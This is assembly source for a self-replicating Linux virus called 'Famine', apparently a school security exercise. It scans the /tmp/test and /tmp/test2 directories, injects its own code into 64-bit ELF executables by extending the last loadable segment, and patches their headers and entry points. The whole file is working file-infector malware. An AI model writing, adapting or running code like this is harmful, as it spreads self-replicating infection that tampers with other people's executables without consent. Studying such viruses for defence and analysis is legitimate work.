section .text
	global _start
	signature db "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>",0

_start:
	nop
	nop
	nop
	nop
	nop
	push   rsp
    push   rax
    push   rdi
    push   rsi
    push   rdx
    push   rcx
	push   rbx
	sub    rsp,0x18
	lea    rdi,[rsp]
	mov    QWORD [rsp],0x706D742F
	mov    QWORD [rsp + 0x4],0x7365742F
	mov    QWORD [rsp + 0x8],0x00000074
	call   famine
	mov    DWORD [rsp+0x8],0x00003274
	lea    rdi,[rsp]
	call   famine
	add    rsp,0x18
	pop    rbx
	pop    rcx
    pop    rdx
    pop    rsi
    pop    rdi
    pop    rax
    pop    rsp
	mov    r8d,0x3c
	xor    ecx,ecx
	xor    edx,edx
	xor    esi,esi
	xor    edi,edi
	call   ft_syscall
	nop
	nop
	nop
	nop
	nop

virus:
	push   r12
	xor    ecx,ecx
	xor    edx,edx
	mov    r8d,0x2
	push   rbp
	mov    esi,0x2
	push   rbx
	sub    rsp,0x40
	call   ft_syscall
	test   eax,eax
	js     virus_end
	movsxd rbp,eax
	mov    rbx,rsp
	xor    r8d,r8d
	xor    ecx,ecx
	mov    edx,0x40
	mov    rsi,rbx
	mov    rdi,rbp
	mov    r12d,eax
	call   ft_syscall
	cmp    eax,0x3f
	jle    virus_end
	sub    rsp,0x40
	mov    ecx,0x10
	mov    rsi,rbx
	mov    rdi,rsp
	rep    movsd
	call   check_file
	mov    rsp,rbx
	test   eax,eax
	jne    virus_end
	sub    rsp,0x40
	mov    ecx,0x10
	mov    rsi,rbx
	mov    rdi,rsp
	rep    movsd
	mov    edi,r12d
	call   writeFile
	mov    rsp,rbx
	mov    r8d,0x3
	xor    ecx,ecx
	xor    edx,edx
	xor    esi,esi
	mov    rdi,rbp
	call   ft_syscall
virus_end:
	add    rsp,0x40
	pop    rbx
	pop    rbp
	pop    r12
	ret


famine:
	push   r15
	mov    edx,0x10800
	mov    rsi,rdi
	mov    r8d,0x101
	push   r14
	xor    ecx,ecx
	push   r13
	push   r12
	push   rbp
	push   rbx
	sub    rsp,0x2048
	mov    QWORD [rsp+0x18],rdi
	mov    rdi,0xffffffffffffff9c
	mov    WORD [rsp+0x3d],0x2e2e
	mov    BYTE [rsp+0x3f],0x0
	mov    WORD [rsp+0x3b],0x2f
	call   ft_syscall
	mov    edx,0x1
	test   eax,eax
	js     famine+384
	cdqe
	mov    QWORD [rsp+0x20],rax
	mov    rdi,QWORD [rsp+0x20]
	mov    r8d,0x4e
	xor    ecx,ecx
	xor    r12d,r12d
	lea    r14,[rsp+0x1040]
	mov    edx,0x1000
	mov    rsi,r14
	call   ft_syscall
	mov    rbp,rax
	mov    r15d,eax
	lea    rax,[rsp+0x3d]
	mov    QWORD [rsp+0x28],rax
	cmp    r12d,r15d
	jge    famine+364
	movsxd r13,r12d
	lea    rsi,[rsp+0x3e]
	add    r13,r14
	lea    rax,[r13+0x12]
	mov    rdi,rax
	mov    QWORD [rsp+0x10],rax
	call   ft_strcmp
	test   eax,eax
	je     famine+354
	mov    rsi,QWORD [rsp+0x28]
	mov    rdi,QWORD [rsp+0x10]
	call   ft_strcmp
	test   eax,eax
	je     famine+354
	mov    rdi,QWORD [rsp+0x18]
	call   ft_strlen
	mov    rdx,QWORD [rsp+0x18]
	xor    esi,esi
	mov    rbx,rax
	lea    rax,[rsp+0x40]
	mov    rcx,rbx
	mov    rdi,rax
	mov    QWORD [rsp+0x8],rax
	call   memncat
	mov    rdi,QWORD [rsp+0x8]
	lea    rdx,[rsp+0x3b]
	mov    rsi,rbx
	mov    ecx,0x1
	call   memncat
	mov    rdi,QWORD [rsp+0x10]
	call   ft_strlen
	mov    rdx,QWORD [rsp+0x10]
	mov    rdi,QWORD [rsp+0x8]
	lea    rsi,[rbx+0x1]
	mov    rcx,rax
	call   memncat
	mov    rdi,QWORD [rsp+0x8]
	call   isDir
	mov    rdi,QWORD [rsp+0x8]
	dec    al
	jne    famine+332
	call   famine
	jmp    famine+337
	call   virus
	mov    rdi,QWORD [rsp+0x8]
	mov    edx,0x1000
	xor    esi,esi
	call   ft_memset
	movzx  eax,WORD [r13+0x10]
	test   ax,ax
	jne    famine+376
	test   ebp,ebp
	jg     famine+89
	xor    edx,edx
	jmp    famine+384
	add    r12d,eax
	jmp    famine+142
	add    rsp,0x2048
	mov    eax,edx
	pop    rbx
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	ret




findLastExecSection:
	movzx  edx,WORD [rsp+0x44]
	xor    eax,eax
	cmp    edx,eax
	jle    findLastExecSection+32
	mov    rcx,rax
	shl    rcx,0x6
	test   BYTE [rdi+rcx*1+0x8],0x4
	je     findLastExecSection+27
	mov    DWORD [rsi],eax
	inc    rax
	jmp    findLastExecSection+7
	ret


findLastLoadSection:
	mov    rcx,QWORD [rsp+0x60]
	mov    r9,QWORD [rsp+0x70]
	xor    eax,eax
	xor    edx,edx
	movzx  r8d,WORD [rsp+0x44]
	add    r9,rcx
	cmp    r8d,eax
	jle    findLastLoadSection+65
	mov    rsi,rax
	shl    rsi,0x6
	mov    rsi,QWORD [rdi+rsi*1+0x10]
	cmp    rsi,rcx
	jb     findLastLoadSection+50
	cmp    r9,rsi
	jae    findLastLoadSection+58
	cmp    dl,0x1
	jne    findLastLoadSection+60
	dec    eax
	ret
	mov    dl,0x1
	inc    rax
	jmp    findLastLoadSection+23
	ret


get_last_load_segment:
	movzx  edx,WORD [rsp+0x40]
	mov    eax,0x1
	cmp    edx,eax
	jle    get_last_load_segment+36
	cmp    DWORD [rdi+0x38],0x1
	je     get_last_load_segment+28
	cmp    DWORD [rdi],0x1
	jne    get_last_load_segment+28
	dec    eax
	ret
	inc    eax
	add    rdi,0x38
	jmp    get_last_load_segment+10
	or     eax,0xffffffff
	ret


increaseFileSize:
	push   r12
	mov    ecx,0x10
	mov    r12,rsi
	push   rbp
	movsxd rbp,edi
	mov    rdx,r12
	push   rbx
	sub    rsp,0xe0
	mov    rdi,rsp
	lea    rsi,[rsp+0x100]
	rep    movsd
	mov    esi,0x8
	mov    edi,0x3
	call   get_section_index
	add    rsp,0x40
	xor    edx,edx
	xor    ecx,ecx
	lea    rsi,[rsp+0x8]
	mov    r8d,0x5
	mov    rdi,rbp
	movsxd rbx,eax
	call   ft_syscall
	mov    rdx,rax
	mov    al,0x1
	test   edx,edx
	js     increaseFileSize+135
	shl    rbx,0x6
	mov    rdx,QWORD [rsp+0x38]
	xor    ecx,ecx
	mov    rdi,rbp
	mov    rax,QWORD [r12+rbx*1+0x20]
	mov    r8d,0x4d
	lea    rsi,[rdx+rax*1+0x1000]
	xor    edx,edx
	call   ft_syscall
	shr    eax,0x1f
	add    rsp,0xa0
	pop    rbx
	pop    rbp
	pop    r12
	ret


ft_syscall:
	mov    QWORD [rsp-0x8],r8
	mov    rax,QWORD [rsp-0x8]
	syscall
	ret


ft_strlen:
	xor    eax,eax
	cmp    BYTE [rdi+rax*1],0x0
	je     ft_strlen+13
	inc    rax
	jmp    ft_strlen+2
	ret


ft_strcmp:
	xor    ecx,ecx
	movzx  eax,BYTE [rdi+rcx*1]
	movzx  edx,BYTE [rsi+rcx*1]
	mov    r8d,eax
	or     r8b,dl
	je     ft_strcmp+28
	inc    rcx
	cmp    al,dl
	je     ft_strcmp+2
	sub    eax,edx
	ret
	xor    eax,eax
	ret


memncat:
	or     rax,0xffffffffffffffff
	add    rdi,rsi
	inc    rax
	cmp    rax,rcx
	je     memncat+25
	mov    sil,BYTE [rdx+rax*1]
	mov    BYTE [rdi+rax*1],sil
	jmp    memncat+7
	xor    eax,eax
	ret


ft_memset:
	mov    rax,rdi
	xor    ecx,ecx
	cmp    rcx,rdx
	je     ft_memset+19
	mov    BYTE [rax+rcx*1],sil
	inc    rcx
	jmp    ft_memset+5
	ret


check_file:
	cmp    DWORD [rsp+0x8],0x464c457f
	mov    eax,0x1
	jne    check_file+39
	cmp    BYTE [rsp+0xc],0x2
	jne    check_file+39
	cmp    BYTE [rsp+0xd],0x1
	jne    check_file+39
	xor    eax,eax
	cmp    BYTE [rsp+0xf],0x0
	setne  al
	ret


ft_strstr:
	xor    ecx,ecx
	cmp    rcx,rdx
	je     ft_strstr+51
	mov    r9,rdx
	xor    eax,eax
	lea    r8,[rdi+rcx*1]
	sub    r9,rcx
	cmp    rax,r9
	je     ft_strstr+46
	mov    r10b,BYTE [rsi+rax*1]
	cmp    BYTE [r8+rax*1],r10b
	jne    ft_strstr+46
	inc    rax
	cmp    BYTE [rsi+rax*1],0x0
	jne    ft_strstr+19
	mov    al,0x1
	ret
	inc    rcx
	jmp    ft_strstr+2
	xor    eax,eax
	ret


checkSignature:
	sub    rsp,0x1010
	mov    [rsp],rdi
checkSignature.do:
	mov    r8,rsi
	xor    rax,rax
	mov    rdi,[rsp]
	lea    rsi,[rsp+0x10]
	mov    rdx,0x1000
	syscall
	mov    [rsp+0x8],rax
	mov    edx,0x1000
	mov    rsi,r8
	lea    rdi,[rsp+0x10]
	call   ft_strstr
	cmp    rax,1
	je     checkSignature.endTrue
	cmp    qword [rsp+0x8],0
	jg     checkSignature.do
	xor    rax,rax
	jmp    checkSignature.end
checkSignature.endTrue:
	mov    eax,0x1
checkSignature.end:
	add    rsp,0x1010
	ret


isDir:
	sub    rsp,0x18
	mov    QWORD [rsp-0x78],0x4
	mov    rax,QWORD [rsp-0x78]
	syscall
	movzx  eax,BYTE [rsp-0x5f]
	shl    eax,0x8
	and    eax,0xf000
	cmp    eax,0x4000
	sete   al
	add    rsp,0x18
	ret


find_offset_nentry_oentry:
	mov    eax,edi
	sub    eax,esi
	cmp    rdi,rsi
	jae    find_offset_nentry_oentry+13
	mov    eax,esi
	sub    eax,edi
	neg    eax
	ret


get_section_index:
	movzx  esi,WORD [rsp+0x44]
	add    rdx,0x4
	xor    eax,eax
	or     ecx,0xffffffff
	cmp    esi,eax
	jle    get_section_index+39
	cmp    QWORD [rdx+0x4],0x3
	jne    get_section_index+31
	cmp    DWORD [rdx],0x8
	cmove  ecx,eax
	inc    eax
	add    rdx,0x40
	jmp    get_section_index+14
	mov    eax,ecx
	ret




setHeaders:
	movsxd rcx,ecx
	mov    rax,rsi
	mov    rsi,rdx
	movsxd r8,r8d
	imul   rcx,rcx,0x38
	shl    r8,0x6
	add    r8,rdi
	add    rax,rcx
	mov    rdx,QWORD [rax+0x28]
	mov    rcx,QWORD [rax+0x18]
	add    rcx,rdx
	mov    r9,rdx
	sub    r9,QWORD [rax+0x20]
	add    rdx,0x1000
	add    rcx,0x42
	mov    QWORD [rsi+0x18],rcx
	mov    rcx,QWORD [rsi+0x28]
	lea    rcx,[r9+rcx*1+0x1000]
	mov    QWORD [rsi+0x28],rcx
	movzx  ecx,WORD [rsi+0x3e]
	add    QWORD [r8+0x20],0x1000
	shl    rcx,0x6
	mov    DWORD [r8+0x4],0x1
	add    rdi,rcx
	mov    rcx,QWORD [rdi+0x18]
	lea    rcx,[r9+rcx*1+0x1000]
	mov    QWORD [rdi+0x18],rcx
	or     DWORD [rax+0x4],0x1
	mov    QWORD [rax+0x28],rdx
	mov    QWORD [rax+0x20],rdx
	ret


CleanPayloadAreaAndShiftFileContent:
	movsxd rdx,edx
	push   r14
	mov    r8d,0x8
	xor    ecx,ecx
	push   r13
	imul   rdx,rdx,0x38
	push   r12
	push   rbp
	movsxd rbp,edi
	push   rbx
	lea    rbx,[rsi+rdx*1]
	mov    rdi,rbp
	xor    edx,edx
	sub    rsp,0x3000
	mov    rsi,QWORD [rbx+0x20]
	add    rsi,QWORD [rbx+0x8]
	call   ft_syscall
	mov    r13,rsp
	xor    r8d,r8d
	xor    ecx,ecx
	mov    edx,0x3000
	mov    rsi,r13
	mov    rdi,rbp
	call   ft_syscall
	mov    rsi,QWORD [rbx+0x8]
	xor    ecx,ecx
	xor    edx,edx
	mov    r14,rax
	mov    rax,QWORD [rbx+0x28]
	mov    r8d,0x8
	mov    rdi,rbp
	lea    r12,[rax+0x1000]
	add    rsi,r12
	call   ft_syscall
	mov    r8d,0x1
	xor    ecx,ecx
	mov    rdx,r14
	mov    rsi,r13
	mov    rdi,rbp
	call   ft_syscall
	xor    eax,eax
	mov    BYTE [r13+rax*1+0x0],0x0
	inc    rax
	cmp    rax,0x3000
	jne    CleanPayloadAreaAndShiftFileContent+142
	mov    rsi,QWORD [rbx+0x20]
	mov    rdi,rbp
	add    rsi,QWORD [rbx+0x8]
	xor    ecx,ecx
	mov    r8d,0x8
	xor    edx,edx
	call   ft_syscall
	mov    rdx,r12
	mov    rsi,r13
	sub    rdx,QWORD [rbx+0x20]
	mov    rdi,rbp
	mov    r8d,0x1
	xor    ecx,ecx
	call   ft_syscall
	add    rsp,0x3000
	pop    rbx
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	ret


change_program_header:
	push   r12
	mov    r8d,0x8
	mov    r12,rdx
	xor    ecx,ecx
	push   rbp
	xor    edx,edx
	mov    rbp,rsi
	xor    esi,esi
	push   rbx
	movsxd rbx,edi
	mov    rdi,rbx
	call   ft_syscall
	lea    rsi,[rsp+0x20]
	mov    rdi,rbx
	xor    ecx,ecx
	mov    r8d,0x1
	mov    edx,0x40
	call   ft_syscall
	mov    rsi,QWORD [rsp+0x40]
	mov    rdi,rbx
	xor    ecx,ecx
	mov    r8d,0x8
	xor    edx,edx
	call   ft_syscall
	movzx  edx,WORD [rsp+0x58]
	mov    rsi,r12
	mov    rdi,rbx
	movzx  eax,WORD [rsp+0x56]
	mov    r8d,0x1
	xor    ecx,ecx
	imul   edx,eax
	movsxd rdx,edx
	call   ft_syscall
	mov    rsi,QWORD [rsp+0x48]
	mov    rdi,rbx
	xor    ecx,ecx
	mov    r8d,0x8
	xor    edx,edx
	call   ft_syscall
	movzx  edx,WORD [rsp+0x5c]
	mov    rsi,rbp
	mov    rdi,rbx
	movzx  eax,WORD [rsp+0x5a]
	mov    r8d,0x1
	xor    ecx,ecx
	imul   edx,eax
	movsxd rdx,edx
	call   ft_syscall
	pop    rbx
	pop    rbp
	pop    r12
	ret
	


addJump:
	push   rbp
	movsxd rbp,edi
	add    rsi,0x99
	xor    ecx,ecx
	mov    rdi,rbp
	mov    r8d,0x8
	sub    rsp,0x20
	mov    QWORD [rsp+0x8],rdx
	xor    edx,edx
	sub    QWORD [rsp+0x8],0x4
	mov    BYTE [rsp+0x1f],0xe9
	call   ft_syscall
	lea    rsi,[rsp+0x1f]
	mov    rdi,rbp
	xor    ecx,ecx
	mov    r8d,0x1
	mov    edx,0x1
	call   ft_syscall
	lea    rsi,[rsp+0x8]
	mov    rdi,rbp
	xor    ecx,ecx
	mov    r8d,0x1
	mov    edx,0x4
	call   ft_syscall
	add    rsp,0x20
	pop    rbp
	ret    
insertCode:
	push   r15
	mov    r15,rdx
	push   r14
	push   r13
	mov    r13d,edi
	push   r12
	lea    r12,[rel zeEnd]
	push   rbp
	movsxd rbp,ecx
	mov    edx,ebp
	imul   rbp,rbp,0x38
	push   rbx
	mov    rbx,rsi
	push   rax
	lea    r14,[rel signature]
	add    rbx,rbp
	sub    r12,r14
	movsxd rbp,r13d
	call   CleanPayloadAreaAndShiftFileContent
	mov    r12d,r12d
	mov    rsi,QWORD [rbx+0x28]
	mov    rdi,rbp
	add    rsi,QWORD [rbx+0x8]
	mov    r8d,0x8
	xor    ecx,ecx
	xor    edx,edx
	call   ft_syscall
	mov    rdx,r12
	mov    rsi,r14
	mov    rdi,rbp
	xor    ecx,ecx
	mov    r8d,0x1
	call   ft_syscall
	mov    rdx,QWORD [r15+0x18]
	mov    rsi,QWORD [rbx+0x28]
	mov    edi,r13d
	sub    rdx,0x9a
	sub    rdx,QWORD [rbx+0x18]
	sub    rdx,rsi
	add    rsi,QWORD [rbx+0x8]
	pop    rcx
	pop    rbx
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	jmp    addJump


writeFile:
	push   rbp
	lea    rsi,[rel signature]
	mov    ecx,0xf
	mov    rbp,rsp
	push   r15
	push   r14
	push   r13
	push   r12
	mov    r12d,edi
	lea    rdi,[rbp-0x6c]
	push   rbx
	sub    rsp,0x58
	movzx  eax,WORD [rbp+0x4c]
	rep    movsd
	lea    rsi,[rbp-0x6c]
	mov    edi,r12d
	mov    r15,rax
	shl    rax,0x6
	sub    rsp,rax
	movzx  eax,WORD [rbp+0x48]
	mov    QWORD [rbp-0x80],rsp
	mov    r14,rax
	imul   rax,rax,0x38
	add    rax,0xf
	and    eax,0x7ffff0
	sub    rsp,rax
	mov    QWORD [rbp-0x78],rsp
	call   checkSignature
	mov    edx,eax
	mov    eax,0x1
	dec    edx
	je     return
	movsxd r13,r12d
	mov    rsi,QWORD [rbp+0x38]
	xor    ecx,ecx
	xor    edx,edx
	mov    rdi,r13
	mov    r8d,0x8
	mov    ebx,0x10
	call   ft_syscall
	movzx  edx,WORD [rbp+0x4a]
	mov    rsi,QWORD [rbp-0x80]
	xor    r8d,r8d
	xor    ecx,ecx
	mov    rdi,r13
	imul   edx,r15d
	movsxd rdx,edx
	call   ft_syscall
	mov    rsi,QWORD [rbp+0x30]
	xor    ecx,ecx
	xor    edx,edx
	mov    rdi,r13
	mov    r8d,0x8
	call   ft_syscall
	movzx  edx,WORD [rbp+0x46]
	mov    rsi,QWORD [rbp-0x78]
	xor    r8d,r8d
	xor    ecx,ecx
	mov    rdi,r13
	imul   edx,r14d
	movsxd rdx,edx
	call   ft_syscall
	sub    rsp,0x40
	lea    rsi,[rbp+0x10]
	mov    rcx,rbx
	mov    rdi,rsp
	rep    movsd
	mov    rdi,QWORD [rbp-0x78]
	call   get_last_load_segment
	mov    rdi,rsp
	mov    ecx,0xe
	sub    rsp,0x40
	movsxd rsi,eax
	mov    rax,QWORD [rbp-0x78]
	mov    r13,rsi
	imul   rsi,rsi,0x38
	add    rsi,rax
	rep    movsd
	mov    rdi,rsp
	lea    rsi,[rbp+0x10]
	mov    rcx,rbx
	rep    movsq
	mov    rdi,QWORD [rbp-0x80]
	call   findLastLoadSection
	add    rsp,0x40
	lea    rsi,[rbp+0x10]
	mov    rcx,rbx
	mov    rdi,rsp
	mov    r14d,eax
	rep    movsd
	mov    edi,r12d
	mov    rsi,QWORD [rbp-0x80]
	call   increaseFileSize
	add    rsp,0x40
	dec    al
	je     return
	mov    rsi,QWORD [rbp-0x78]
	mov    ecx,r13d
	lea    rdx,[rbp+0x10]
	mov    edi,r12d
	call   insertCode
	mov    rsi,QWORD [rbp-0x78]
	mov    rdi,QWORD [rbp-0x80]
	mov    r8d,r14d
	mov    ecx,r13d
	lea    rdx,[rbp+0x10]
	call   setHeaders
	sub    rsp,0x40
	lea    rsi,[rbp+0x10]
	mov    rcx,rbx
	mov    rdi,rsp
	rep    movsd
	mov    edi,r12d
	mov    rdx,QWORD [rbp-0x78]
	mov    rsi,QWORD [rbp-0x80]
	call   change_program_header
	add    rsp,0x40
return:
	xor    eax,eax
	lea    rsp,[rbp-0x28]
	pop    rbx
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	pop    rbp
	ret

zeEnd:
	ret
	